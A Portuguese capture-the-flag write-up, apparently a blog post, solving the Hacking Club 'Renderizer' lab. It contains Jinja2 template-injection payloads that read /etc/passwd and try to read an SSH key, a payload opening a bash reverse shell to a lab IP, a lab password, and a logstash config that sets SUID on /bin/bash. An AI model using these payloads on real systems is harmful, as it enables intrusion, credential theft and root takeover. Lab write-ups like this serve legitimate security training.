@@ -1,0 +1,175 @@
+---
+title: 'Renderizer Writeup'
+date: '2024-07-13'
+tags: ['SSTI','RCE']
+draft: false
+summary: 'Writeup do CTF Reader da Hacking Club.'
+images: ['/static/images/renderizer-writeup-images/1.png']
+authors: ['default']
+---
+![Writeup-Renderizer 1](/static/images/renderizer-writeup-images/1.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: Renderizer
+
+### IP: 172.16.14.128
+
+## Port Scanning
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```python
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f7:37:6a:01:16:84:08:ea:92:19:b0:b3:ba:22:71:34 (ECDSA)
+|_  256 59:00:f0:d6:c4:d4:f3:91:85:8f:1a:d2:1d:29:87:9e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD
+|_http-title: Renderizer
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+Somente as portas 22(SSH) e 80 (HTTP) estão abertas.
+
+---
+
+![Writeup-Renderizer 2](/static/images/renderizer-writeup-images/2.png)
+
+`sudo vim /etc/hosts`
+![Writeup-Renderizer 3](/static/images/renderizer-writeup-images/3.png)
+### [http://renderizer.hc](http://renderizer.hc)
+
+
+![Writeup-Renderizer 4](/static/images/renderizer-writeup-images/4.png)
+![Writeup-Renderizer 5](/static/images/renderizer-writeup-images/5.png)
+
+Ele diz que é um jinja2 , a gente pode deduzir que se trata de um SSTI (Server-Side Tempalte Injection), pra testar eu mandei um `{{7*7}}.`
+
+![Writeup-Renderizer 6](/static/images/renderizer-writeup-images/6.png)
+
+Depois de fazer algumas pesquisas , eu achei uma payload pra leitura de arquivos que funcionou.
+
+`{{ get_flashed_messages.globals.builtins.open("/etc/passwd").read() }}`
+
+![Writeup-Renderizer 7](/static/images/renderizer-writeup-images/7.png)
+
+john:x:1001:1001::/home/john:/bin/bash e ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash são os usuários.
+
+Tentei utilizar o mesmo pra pegar a chave ssh , mas não deu:
+
+`{{ get_flashed_messages.globals.builtins.open("/home/john/.ssh/id_rsa").read() }}`
+
+![Writeup-Renderizer 8](/static/images/renderizer-writeup-images/8.png)
+
+`{{ "teste".class.mro[1].subclasses() }}` tentei usar essa payload pra verificar as subclasses presentes , mas tava dando um erro acredito que o servidor tenha algum tipo de proteção, então eu fui atrás de outro jeito de verificar.
+
+E consegui assim:
+
+```
+{% for subclass in ''.__class__.__mro__[1].__subclasses__() %}
+    <h2>{{ subclass.__name__ }}</h2>
+    <ul>
+    {% for attr in subclass.__dict__.keys() %}
+        <li>{{ attr }}</li>
+    {% endfor %}
+    </ul>
+{% endfor %}
+```
+
+![Writeup-Renderizer 9](/static/images/renderizer-writeup-images/9.png)
+
+Agora é achar a posição do array do Popen pra ganhar um RCE.
+
+## Initial Access
+
+Payload do mano vert16x pra achar a posição do array do Popen automaticamente nos possibilitando um RCE.
+
+```
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("/bin/bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+![Writeup-Renderizer 10](/static/images/renderizer-writeup-images/10.png)
+## Privillege Escalation
+
+`cat /etc/crontab`
+
+![Writeup-Renderizer 11](/static/images/renderizer-writeup-images/11.png)
+Eu pensei incialmente em simplesmente alterar a pasta webapp com os comandos abaixo mas não funcionou, por alguma razão a cron não executava.
+
+```
+rm -rf webapp
+echo '#!/bin/bash' > /home/john/webapp
+echo 'chmod u+s /bin/bash' >> /home/john/webapp
+chmod +x webapp
+```
+
+Então eu fui ver a pasta que estava sendo feito o backup `/var/backups`
+
+![Writeup-Renderizer 12](/static/images/renderizer-writeup-images/12.png)
+
+Se eu tentar dar o `unzip webapp-03-01-2024.zip` ele da permission denied
+
+![Writeup-Renderizer 13](/static/images/renderizer-writeup-images/13.png)
+
+Então a gente precisa copiar esse `webapp-03-01-2024.zip` pra pasta tmp 
+`cp webapp-03-01-2024.zip /tmp`
+
+Na pasta tmp basta a gente unzipar o arquivo:
+
+`unzip webapp-03-01-2024.zip`
+
+![Writeup-Renderizer 14](/static/images/renderizer-writeup-images/14.png)
+
+Depois de unzipar a pasta webapp tem uma variavel de ambiente `.env` que por sinal é a mesma senha do usuario que estamos logado `john` .
+
+![Writeup-Renderizer 15](/static/images/renderizer-writeup-images/15.png)
+
+`john:bwsTuCtSYue7G4`
+
+`sudo -l`
+![Writeup-Renderizer 16](/static/images/renderizer-writeup-images/16.png)
+
+Pra explorar o logstash a gente precisa criar um arquivo `.yaml` malicioso.
+
+[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash)
+
+![Writeup-Renderizer 17](/static/images/renderizer-writeup-images/17.png)
+
+```
+input {
+  exec {
+    command => "chmod u+s /bin/bash"
+    interval => 120
+  }
+}
+
+output {
+  file {
+    path => "/tmp/output.log"
+    codec => rubydebug
+  }
+}
+
+```
+
+depois é so rodar o comando , `sudo /root/logstash/bin/logstash -f /tmp/webapp/teste.yaml`
+
+Demora alguns segundos pra rodar:
+
+![Writeup-Renderizer 18](/static/images/renderizer-writeup-images/18.png)
+
+E o /bin/bash vai virar SUID após a execução do logstash.
+
+![Writeup-Renderizer 19](/static/images/renderizer-writeup-images/19.png)
+![Writeup-Renderizer 20](/static/images/renderizer-writeup-images/20.png)
+## Proof
+
+![Writeup-Renderizer 21](/static/images/renderizer-writeup-images/21.png)
+
